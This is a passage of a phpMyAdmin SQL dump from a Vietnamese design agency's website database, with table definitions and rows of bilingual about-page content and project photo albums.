-- phpMyAdmin SQL Dump
-- version 4.6.6
-- https://www.phpmyadmin.net/
--
-- Máy chủ: localhost
-- Thời gian đã tạo: Th10 18, 2018 lúc 09:19 AM
-- Phiên bản máy phục vụ: 5.5.31-log
-- Phiên bản PHP: 5.6.30

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Cơ sở dữ liệu: `brity_dbb`
--

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `about`
--

CREATE TABLE `about` (
  `id` int(10) UNSIGNED NOT NULL,
  `user_id` int(11) NOT NULL DEFAULT '0',
  `name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `name_en` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `alias` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `alias_en` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `photo` text COLLATE utf8_unicode_ci,
  `mota` text COLLATE utf8_unicode_ci,
  `mota_en` text CHARACTER SET utf8,
  `link` text COLLATE utf8_unicode_ci,
  `content` longtext COLLATE utf8_unicode_ci,
  `content_en` longtext CHARACTER SET utf8,
  `status` int(11) NOT NULL DEFAULT '1',
  `title` text COLLATE utf8_unicode_ci,
  `title_en` varchar(250) CHARACTER SET utf8 DEFAULT NULL,
  `keyword` longtext COLLATE utf8_unicode_ci,
  `keyword_en` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `description` longtext COLLATE utf8_unicode_ci,
  `description_en` text CHARACTER SET utf8,
  `com` text COLLATE utf8_unicode_ci,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `about`
--

INSERT INTO `about` (`id`, `user_id`, `name`, `name_en`, `alias`, `alias_en`, `photo`, `mota`, `mota_en`, `link`, `content`, `content_en`, `status`, `title`, `title_en`, `keyword`, `keyword_en`, `description`, `description_en`, `com`, `created_at`, `updated_at`) VALUES
(31, 5, 'Brity Creative', NULL, 'brity-creative', NULL, '1524716126_news-11.jpg', '<p>Với đội ngũ trẻ v&agrave; đầy nhiệt huyết, đ&atilde; c&oacute; nhiều năm trong lĩnh vực s&aacute;ng tạo v&agrave; ph&aacute;t triển thương hiệu.</p>\r\n<p><strong>Brity</strong> sẽ gi&uacute;p bạn s&aacute;ng tạo v&agrave; x&acirc;y dựng thương hiệu nhất qu&aacute;n v&agrave; kh&aacute;c biệt.</p>', '<p>Our team</p>', NULL, NULL, NULL, 1, NULL, NULL, NULL, NULL, NULL, NULL, 'gioi-thieu', '2018-07-25 09:05:40', '2018-07-25 02:05:40'),
(80, 5, NULL, NULL, '', NULL, NULL, '<blockquote>\r\n<h1 class=\"title-h\">Ch&uacute;ng t&ocirc;i c&oacute; thể l&agrave;m g&igrave; cho doanh nghiệp của bạn?</h1>\r\n</blockquote>', '<p><span style=\"font-size: 18pt;\">What can we do for your business?</span></p>', NULL, '<h2><strong>Ch&uacute;ng t&ocirc;i</strong><br /><strong>lu&ocirc;n lắng nghe</strong><br /><strong>từ kh&aacute;ch h&agrave;ng !!!</strong></h2>', '<p><span style=\"font-size: 36pt;\"><strong>What can we do for your business?</strong></span></p>', 1, NULL, NULL, NULL, NULL, NULL, NULL, 'lien-he', '2018-05-30 03:55:28', '2018-05-29 20:55:28'),
(81, 5, NULL, NULL, '', NULL, NULL, '<h2 class=\"title-h\">H&atilde;y tham khảo c&ocirc;ng việc v&agrave; tự tin gửi CV cho ch&uacute;ng t&ocirc;i !</h2>', '<p><span style=\"font-size: 18pt;\">What are you waiting for? Come and join our team now for the great adventures !</span></p>', NULL, NULL, NULL, 1, NULL, NULL, NULL, NULL, NULL, NULL, 'tuyendung', '2018-06-14 02:45:52', '2018-06-13 19:45:52'),
(82, 5, 'QUY TRÌNH', 'Working process', 'quy-trinh', NULL, NULL, '<p>Ch&uacute;ng t&ocirc;i lu&ocirc;n hướng tới một quy tr&igrave;nh l&agrave;m việc nhanh gọn m&agrave; hiệu quả, tối ưu thời gian v&agrave; c&ocirc;ng sức nhằm đạt được chất lượng sản phẩm cao nhất với chi ph&iacute; hợp l&yacute; nhất cho thương hiệu của bạn.</p>\r\n<p>&nbsp;</p>\r\n<p>&nbsp;</p>\r\n<p>&nbsp;</p>', '<p>The process of building and designing a brand identity usually begins with customer research on: Brand positioning, product, customer ... can help creative ideas be formed. Most of the time the process of building and designing brand identity is based on the scale, complexity and number of design elements of the project. In order to successfully build the brand identity system, the following steps should be taken:</p>', NULL, NULL, NULL, 1, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', '2018-10-16 03:11:32', '2018-10-15 20:11:32');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `album_project`
--

CREATE TABLE `album_project` (
  `id` int(10) UNSIGNED NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `project_id` int(11) DEFAULT NULL,
  `name` text COLLATE utf8_unicode_ci,
  `link` text COLLATE utf8_unicode_ci,
  `photo` text COLLATE utf8_unicode_ci,
  `icon` text COLLATE utf8_unicode_ci,
  `mota` longtext COLLATE utf8_unicode_ci,
  `content` longtext COLLATE utf8_unicode_ci,
  `status` int(11) NOT NULL DEFAULT '1',
  `type_view` int(11) DEFAULT '1',
  `com` text COLLATE utf8_unicode_ci,
  `stt` int(11) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `album_project`
--

INSERT INTO `album_project` (`id`, `user_id`, `project_id`, `name`, `link`, `photo`, `icon`, `mota`, `content`, `status`, `type_view`, `com`, `stt`, `created_at`, `updated_at`) VALUES
(242, NULL, 1, NULL, NULL, '[{\"photo\":\"1531475120_011.jpg\"},{\"photo\":\"1531475120_012.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 9, '2018-07-13 02:45:22', '2018-07-13 02:45:22'),
(235, NULL, 1, NULL, NULL, '[{\"photo\":\"1531472355_002.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 2, '2018-07-13 01:59:15', '2018-07-13 01:59:15'),
(236, NULL, 1, NULL, NULL, '[{\"photo\":\"1531472371_003.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 3, '2018-07-13 01:59:31', '2018-07-13 01:59:31'),
(234, NULL, 1, NULL, NULL, '[{\"photo\":\"1531472336_001.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 1, '2018-07-13 01:58:56', '2018-07-13 01:58:56'),
(237, NULL, 1, NULL, NULL, '[{\"photo\":\"1531472483_004.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 4, '2018-07-13 02:01:23', '2018-07-13 02:01:23'),
(238, NULL, 1, NULL, NULL, '[{\"photo\":\"1531472493_005.jpg\"},{\"photo\":\"1531472493_006.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 5, '2018-07-13 02:01:33', '2018-07-13 02:01:33'),
(239, NULL, 1, NULL, NULL, '[{\"photo\":\"1531472502_007.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 6, '2018-07-13 02:01:43', '2018-07-13 02:01:43'),
(240, NULL, 1, NULL, NULL, '[{\"photo\":\"1531472515_008.jpg\"},{\"photo\":\"1531472515_009.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 7, '2018-07-13 02:01:55', '2018-07-13 02:01:55'),
(241, NULL, 1, NULL, NULL, '[{\"photo\":\"1531474236_010.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 8, '2018-07-13 02:30:36', '2018-07-13 02:30:36'),
(180, NULL, 8, NULL, NULL, '[{\"photo\":\"1530939643_2.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 2, '2018-07-06 22:00:43', '2018-07-06 22:00:43'),
(94, NULL, 6, NULL, NULL, '[{\"photo\":\"1530783137_1.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 1, '2018-07-05 02:32:17', '2018-07-05 02:32:17'),
(99, NULL, 6, NULL, NULL, '[{\"photo\":\"1530784876_01.jpg\"},{\"photo\":\"1530784876_02.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 2, '2018-07-05 03:01:16', '2018-07-05 03:01:16'),
(100, NULL, 6, NULL, NULL, '[{\"photo\":\"1530860861_03.jpg\"},{\"photo\":\"1530860861_04.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 3, '2018-07-06 00:07:41', '2018-07-06 00:07:41'),
(104, NULL, 6, NULL, NULL, '[{\"photo\":\"1530862798_Color.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 4, '2018-07-06 07:40:13', '2018-07-06 00:40:13'),
(102, NULL, 6, NULL, NULL, '[{\"photo\":\"1530862257_9.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 5, '2018-07-06 00:30:57', '2018-07-06 00:30:57'),
(103, NULL, 6, NULL, NULL, '[{\"photo\":\"1530862266_7.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 6, '2018-07-06 00:31:06', '2018-07-06 00:31:06'),
(108, NULL, 6, NULL, NULL, '[{\"photo\":\"1530863312_05.jpg\"},{\"photo\":\"1530863312_06.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 7, '2018-07-06 00:48:32', '2018-07-06 00:48:32'),
(112, NULL, 6, NULL, NULL, '[{\"photo\":\"1530864394_09.jpg\"},{\"photo\":\"1530864394_10.jpg\"},{\"photo\":\"1530864394_11.jpg\"}]', NULL, NULL, NULL, 1, 3, NULL, 8, '2018-07-06 01:06:34', '2018-07-06 01:06:34'),
(119, NULL, 6, NULL, NULL, '[{\"photo\":\"1530868832_12.jpg\"},{\"photo\":\"1530868832_13.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 11, '2018-07-06 02:20:32', '2018-07-06 02:20:32'),
(123, NULL, 5, NULL, NULL, '[{\"photo\":\"1530869933_3.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 2, '2018-07-06 02:38:53', '2018-07-06 02:38:53'),
(118, NULL, 6, NULL, NULL, '[{\"photo\":\"1530868818_14.jpg\"},{\"photo\":\"1530868818_15.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 10, '2018-07-06 02:20:18', '2018-07-06 02:20:18'),
(149, NULL, 6, NULL, NULL, '[{\"photo\":\"1530929246_17 (2).jpg\"},{\"photo\":\"1530929246_17 (3).jpg\"},{\"photo\":\"1530929246_17 (4).jpg\"}]', NULL, NULL, NULL, 1, 4, NULL, 11, '2018-07-06 19:07:26', '2018-07-06 19:07:26'),
(122, NULL, 5, NULL, NULL, '[{\"photo\":\"1530869919_2.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 1, '2018-07-06 02:38:39', '2018-07-06 02:38:39'),
(124, NULL, 5, NULL, NULL, '[{\"photo\":\"1530869941_4.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 3, '2018-07-06 02:39:01', '2018-07-06 02:39:01'),
(125, NULL, 5, NULL, NULL, '[{\"photo\":\"1530869997_7.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 4, '2018-07-06 02:39:57', '2018-07-06 02:39:57'),
(126, NULL, 5, NULL, NULL, '[{\"photo\":\"1530870104_03.jpg\"},{\"photo\":\"1530870104_04.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 5, '2018-07-06 02:41:44', '2018-07-06 02:41:44'),
(127, NULL, 5, NULL, NULL, '[{\"photo\":\"1530870165_6.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 6, '2018-07-06 02:42:45', '2018-07-06 02:42:45'),
(129, NULL, 5, NULL, NULL, '[{\"photo\":\"1530870235_8.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 7, '2018-07-06 02:43:55', '2018-07-06 02:43:55'),
(130, NULL, 5, NULL, NULL, '[{\"photo\":\"1530870243_9.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 8, '2018-07-06 02:44:03', '2018-07-06 02:44:03'),
(167, NULL, 5, NULL, NULL, '[{\"photo\":\"1530934440_05 (2).jpg\"},{\"photo\":\"1530934440_05 (3).jpg\"},{\"photo\":\"1530934440_05.jpg\"}]', NULL, NULL, NULL, 1, 3, NULL, 11, '2018-07-06 20:34:00', '2018-07-06 20:34:00'),
(142, NULL, 5, NULL, NULL, '[{\"photo\":\"1530870985_13.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 10, '2018-07-06 02:56:25', '2018-07-06 02:56:25'),
(144, NULL, 5, NULL, NULL, '[{\"photo\":\"1530871999_12.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 9, '2018-07-06 03:13:19', '2018-07-06 03:13:19'),
(150, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, NULL, NULL, 0, '2018-07-06 19:16:29', '2018-07-06 19:16:29'),
(161, NULL, 6, NULL, NULL, '[{\"photo\":\"1530931006_21 (1).jpg\"},{\"photo\":\"1530931006_21 (2).jpg\"},{\"photo\":\"1530931006_21 (4).jpg\"}]', NULL, NULL, NULL, 1, 3, NULL, 12, '2018-07-06 19:36:46', '2018-07-06 19:36:46'),
(163, NULL, 6, NULL, NULL, '[{\"photo\":\"1530931071_40.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 13, '2018-07-06 19:37:51', '2018-07-06 19:37:51'),
(164, NULL, 6, NULL, NULL, '[{\"photo\":\"1530932054_22.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 14, '2018-07-06 19:54:14', '2018-07-06 19:54:14'),
(166, NULL, 6, NULL, NULL, '[{\"photo\":\"1530933725_Mobile.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 15, '2018-07-06 20:22:05', '2018-07-06 20:22:05'),
(168, NULL, 5, NULL, NULL, '[{\"photo\":\"1530934601_15.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 12, '2018-07-06 20:36:41', '2018-07-06 20:36:41'),
(169, NULL, 5, NULL, NULL, '[{\"photo\":\"1530934608_16.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 13, '2018-07-06 20:36:48', '2018-07-06 20:36:48'),
(170, NULL, 5, NULL, NULL, '[{\"photo\":\"1530934614_17.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 14, '2018-07-06 20:36:54', '2018-07-06 20:36:54'),
(171, NULL, 5, NULL, NULL, '[{\"photo\":\"1530936144_18.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 15, '2018-07-06 21:02:24', '2018-07-06 21:02:24'),
(172, NULL, 5, NULL, NULL, '[{\"photo\":\"1530937045_19.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 16, '2018-07-06 21:17:25', '2018-07-06 21:17:25'),
(174, NULL, 5, NULL, NULL, '[{\"photo\":\"1530938503_20.jpg\"},{\"photo\":\"1530938503_21.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 17, '2018-07-06 21:41:43', '2018-07-06 21:41:43'),
(186, NULL, 5, NULL, NULL, '[{\"photo\":\"1531124235_1.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 19, '2018-07-09 01:17:15', '2018-07-09 01:17:15'),
(179, NULL, 8, NULL, NULL, '[{\"photo\":\"1530939449_01.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 1, '2018-07-06 21:57:29', '2018-07-06 21:57:29'),
(181, NULL, 8, NULL, NULL, '[{\"photo\":\"1530939651_3.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 3, '2018-07-06 22:00:51', '2018-07-06 22:00:51'),
(182, NULL, 8, NULL, NULL, '[{\"photo\":\"1530939659_1.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 4, '2018-07-06 22:00:59', '2018-07-06 22:00:59'),
(183, NULL, 8, NULL, NULL, '[{\"photo\":\"1530939668_4.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 5, '2018-07-06 22:01:08', '2018-07-06 22:01:08'),
(185, NULL, 5, NULL, NULL, '[{\"photo\":\"1531124223_22.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 18, '2018-07-09 01:17:03', '2018-07-09 01:17:03'),
(187, NULL, 8, NULL, NULL, '[{\"photo\":\"1531125030_9.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 6, '2018-07-09 01:30:30', '2018-07-09 01:30:30'),
(188, NULL, 8, NULL, NULL, '[{\"photo\":\"1531126049_10.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 7, '2018-07-09 01:47:29', '2018-07-09 01:47:29'),
(189, NULL, 8, NULL, NULL, '[{\"photo\":\"1531126059_8.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 8, '2018-07-09 01:47:39', '2018-07-09 01:47:39'),
(190, NULL, 8, NULL, NULL, '[{\"photo\":\"1531126067_11.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 9, '2018-07-09 01:47:47', '2018-07-09 01:47:47'),
(191, NULL, 8, NULL, NULL, '[{\"photo\":\"1531127051_14.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 10, '2018-07-09 02:04:11', '2018-07-09 02:04:11'),
(192, NULL, 8, NULL, NULL, '[{\"photo\":\"1531127107_13.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 11, '2018-07-09 02:05:07', '2018-07-09 02:05:07'),
(193, NULL, 2, NULL, NULL, '[{\"photo\":\"1531127407_001.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 1, '2018-07-09 02:10:07', '2018-07-09 02:10:07'),
(202, NULL, 2, NULL, NULL, '[{\"photo\":\"1531128426_14.jpg\"},{\"photo\":\"1531128426_15.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 3, '2018-07-09 02:27:06', '2018-07-09 02:27:06'),
(201, NULL, 2, NULL, NULL, '[{\"photo\":\"1531128419_8.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 2, '2018-07-09 02:26:59', '2018-07-09 02:26:59'),
(203, NULL, 2, NULL, NULL, '[{\"photo\":\"1531128438_2.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 4, '2018-07-09 02:27:18', '2018-07-09 02:27:18'),
(204, NULL, 2, NULL, NULL, '[{\"photo\":\"1531128464_5.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 5, '2018-07-09 02:27:44', '2018-07-09 02:27:44'),
(205, NULL, 2, NULL, NULL, '[{\"photo\":\"1531128696_16.jpg\"},{\"photo\":\"1531128696_17.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 6, '2018-07-09 02:31:36', '2018-07-09 02:31:36'),
(207, NULL, 2, NULL, NULL, '[{\"photo\":\"1531129570_6.6.jpg\"},{\"photo\":\"1531129570_6.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 7, '2018-07-09 02:46:10', '2018-07-09 02:46:10'),
(208, NULL, 2, NULL, NULL, '[{\"photo\":\"1531129636_9.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 8, '2018-07-09 02:47:16', '2018-07-09 02:47:16'),
(209, NULL, 2, NULL, NULL, '[{\"photo\":\"1531129864_18.jpg\"},{\"photo\":\"1531129864_19.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 9, '2018-07-09 02:51:04', '2018-07-09 02:51:04'),
(210, NULL, 2, NULL, NULL, '[{\"photo\":\"1531129915_Untitled-1.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 10, '2018-07-09 02:51:55', '2018-07-09 02:51:55'),
(211, NULL, 2, NULL, NULL, '[{\"photo\":\"1531130003_20.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 11, '2018-07-09 02:53:23', '2018-07-09 02:53:23'),
(212, NULL, 2, NULL, NULL, '[{\"photo\":\"1531130199_21.jpg\"},{\"photo\":\"1531130199_22.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 12, '2018-07-09 02:56:39', '2018-07-09 02:56:39'),
(213, NULL, 2, NULL, NULL, '[{\"photo\":\"1531130745_23.jpg\"},{\"photo\":\"1531130746_24.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 13, '2018-07-09 03:05:46', '2018-07-09 03:05:46'),
(214, NULL, 2, NULL, NULL, '[{\"photo\":\"1531215219_25.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 14, '2018-07-10 02:33:39', '2018-07-10 02:33:39'),
(218, NULL, 2, NULL, NULL, '[{\"photo\":\"1531217098_27.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 16, '2018-07-10 03:04:58', '2018-07-10 03:04:58'),
(217, NULL, 2, NULL, NULL, '[{\"photo\":\"1531216932_13.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 16, '2018-07-10 03:02:12', '2018-07-10 03:02:12'),
(220, NULL, 2, NULL, NULL, '[{\"photo\":\"1531304600_28.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 17, '2018-07-11 03:23:20', '2018-07-11 03:23:20'),
(223, NULL, 2, NULL, NULL, '[{\"photo\":\"1531305074_29.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 18, '2018-07-11 03:31:14', '2018-07-11 03:31:14'),
(222, NULL, 2, NULL, NULL, '[{\"photo\":\"1531304619_30.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 19, '2018-07-11 03:23:39', '2018-07-11 03:23:39'),
(245, NULL, 1, NULL, NULL, '[{\"photo\":\"1531476575_014.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 11, '2018-07-13 03:09:35', '2018-07-13 03:09:35'),
(247, NULL, 1, NULL, NULL, '[{\"photo\":\"1531477197_015.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 10, '2018-07-13 03:19:57', '2018-07-13 03:19:57'),
(264, NULL, 15, NULL, NULL, '[{\"photo\":\"1539661593_1.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 1, '2018-10-16 03:46:54', '2018-10-15 20:46:54'),
(265, NULL, 15, NULL, NULL, '[{\"photo\":\"1539661699_01.jpg\"},{\"photo\":\"1539661699_02.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 2, '2018-10-15 20:48:19', '2018-10-15 20:48:19'),
(266, NULL, 15, NULL, NULL, '[{\"photo\":\"1539661718_03.jpg\"},{\"photo\":\"1539661718_04.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 3, '2018-10-15 20:48:38', '2018-10-15 20:48:38'),
(267, NULL, 15, NULL, NULL, '[{\"photo\":\"1539661738_Color.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 4, '2018-10-15 20:48:58', '2018-10-15 20:48:58'),
(268, NULL, 15, NULL, NULL, '[{\"photo\":\"1539661749_9.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 5, '2018-10-15 20:49:09', '2018-10-15 20:49:09'),
(269, NULL, 15, NULL, NULL, '[{\"photo\":\"1539661767_7.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 6, '2018-10-15 20:49:27', '2018-10-15 20:49:27'),
(270, NULL, 15, NULL, NULL, '[{\"photo\":\"1539661792_05.jpg\"},{\"photo\":\"1539661792_06.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 7, '2018-10-15 20:49:52', '2018-10-15 20:49:52'),
(271, NULL, 15, NULL, NULL, '[{\"photo\":\"1539661822_09.jpg\"},{\"photo\":\"1539661822_10.jpg\"},{\"photo\":\"1539661822_11.jpg\"}]', NULL, NULL, NULL, 1, 3, NULL, 8, '2018-10-16 03:50:45', '2018-10-15 20:50:45'),
(272, NULL, 15, NULL, NULL, '[{\"photo\":\"1539661889_14 - Copy.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 9, '2018-10-16 03:57:47', '2018-10-15 20:57:47'),
(273, NULL, 15, NULL, NULL, '[{\"photo\":\"1539661914_13.jpg\"},{\"photo\":\"1539661914_Reception.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 10, '2018-10-15 20:51:54', '2018-10-15 20:51:54'),
(274, NULL, 15, NULL, NULL, '[{\"photo\":\"1539661951_17 (2).jpg\"},{\"photo\":\"1539661952_17 (3).jpg\"},{\"photo\":\"1539661952_17 (4).jpg\"}]', NULL, NULL, NULL, 1, 4, NULL, 11, '2018-10-15 20:52:32', '2018-10-15 20:52:32'),
(275, NULL, 15, NULL, NULL, '[{\"photo\":\"1539662145_21 (1).jpg\"},{\"photo\":\"1539662145_21 (2).jpg\"},{\"photo\":\"1539662145_21 (4).jpg\"}]', NULL, NULL, NULL, 1, 4, NULL, 12, '2018-10-15 20:55:45', '2018-10-15 20:55:45'),
(276, NULL, 15, NULL, NULL, '[{\"photo\":\"1539662154_40.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 13, '2018-10-15 20:55:54', '2018-10-15 20:55:54'),
(277, NULL, 15, NULL, NULL, '[{\"photo\":\"1539662165_22.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 14, '2018-10-15 20:56:05', '2018-10-15 20:56:05'),
(278, NULL, 15, NULL, NULL, '[{\"photo\":\"1539662180_Mobile.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 15, '2018-10-15 20:56:20', '2018-10-15 20:56:20'),
(299, NULL, 14, NULL, NULL, '[{\"photo\":\"1539763613_001.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 1, '2018-10-17 01:06:53', '2018-10-17 01:06:53'),
(280, NULL, 13, NULL, NULL, '[{\"photo\":\"1539673406_3.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 1, '2018-10-16 00:03:26', '2018-10-16 00:03:26'),
(281, NULL, 13, NULL, NULL, '[{\"photo\":\"1539673829_2.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 2, '2018-10-16 00:10:29', '2018-10-16 00:10:29'),
(282, NULL, 13, NULL, NULL, '[{\"photo\":\"1539673856_7.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 3, '2018-10-16 00:10:56', '2018-10-16 00:10:56'),
(283, NULL, 13, NULL, NULL, '[{\"photo\":\"1539673874_4.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 4, '2018-10-16 00:11:14', '2018-10-16 00:11:14'),
(284, NULL, 13, NULL, NULL, '[{\"photo\":\"1539673897_03.jpg\"},{\"photo\":\"1539673897_04.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 5, '2018-10-16 00:11:37', '2018-10-16 00:11:37'),
(285, NULL, 13, NULL, NULL, '[{\"photo\":\"1539673922_6.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 6, '2018-10-16 00:12:02', '2018-10-16 00:12:02'),
(286, NULL, 13, NULL, NULL, '[{\"photo\":\"1539673930_8.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 7, '2018-10-16 00:12:10', '2018-10-16 00:12:10'),
(287, NULL, 13, NULL, NULL, '[{\"photo\":\"1539673940_01.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 8, '2018-10-16 00:12:20', '2018-10-16 00:12:20'),
(288, NULL, 13, NULL, NULL, '[{\"photo\":\"1539673950_12.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 9, '2018-10-16 00:12:30', '2018-10-16 00:12:30'),
(289, NULL, 13, NULL, NULL, '[{\"photo\":\"1539673960_13.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 10, '2018-10-16 00:12:40', '2018-10-16 00:12:40'),
(290, NULL, 13, NULL, NULL, '[{\"photo\":\"1539673984_05 (2).jpg\"},{\"photo\":\"1539673984_05 (3).jpg\"},{\"photo\":\"1539673984_05.jpg\"}]', NULL, NULL, NULL, 1, 3, NULL, 11, '2018-10-16 00:13:04', '2018-10-16 00:13:04'),
(291, NULL, 13, NULL, NULL, '[{\"photo\":\"1539674015_15.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 12, '2018-10-16 00:13:35', '2018-10-16 00:13:35'),
(292, NULL, 13, NULL, NULL, '[{\"photo\":\"1539674026_16.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 13, '2018-10-16 00:13:46', '2018-10-16 00:13:46'),
(293, NULL, 13, NULL, NULL, '[{\"photo\":\"1539674035_17.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 14, '2018-10-16 00:13:55', '2018-10-16 00:13:55'),
(294, NULL, 13, NULL, NULL, '[{\"photo\":\"1539674043_18.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 15, '2018-10-16 00:14:03', '2018-10-16 00:14:03'),
(295, NULL, 13, NULL, NULL, '[{\"photo\":\"1539674054_19.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 16, '2018-10-16 00:14:14', '2018-10-16 00:14:14'),
(296, NULL, 13, NULL, NULL, '[{\"photo\":\"1539674067_20.jpg\"},{\"photo\":\"1539674067_21.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 17, '2018-10-16 00:14:27', '2018-10-16 00:14:27'),
